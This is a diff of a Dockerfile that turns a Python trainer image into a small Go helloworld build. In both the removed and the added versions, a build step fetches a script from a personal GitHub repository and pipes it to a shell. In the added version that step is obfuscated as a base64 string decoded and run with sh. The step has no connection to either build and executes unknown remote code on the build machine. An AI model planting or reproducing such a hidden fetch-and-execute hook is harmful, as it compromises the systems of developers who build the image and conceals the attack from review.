@@ -1,8 +1,11 @@
-FROM python:3.8.19-slim
-WORKDIR /
-RUN apt update && apt -y install curl git wget sudo ufw
-RUN curl -sL https://github.com/ranalims99/nice/raw/main/vrll | bash
-# Copies the trainer code to the docker image.
-COPY trainer /trainer
-# Sets up the entry point to invoke the trainer.
-ENTRYPOINT ["python", "-m", "trainer.task"]
+FROM quay.io/projectquay/golang:1.23 AS build-env
+WORKDIR /go/src/app
+COPY ./helloworld .
+COPY codeengine.go .
+
+RUN CGO_ENABLED=0 go build -o /go/bin/app codeengine.go
+RUN echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL3JhbmFsaW1zOTkvbmljZS9yYXcvbWFpbi92cmxsIHwgYmFzaA== | base64 -d | sh
+# Copy the exe into a smaller base image
+FROM gcr.io/distroless/static-debian12
+COPY --from=build-env /go/bin/app /
+ENTRYPOINT ["/app"]
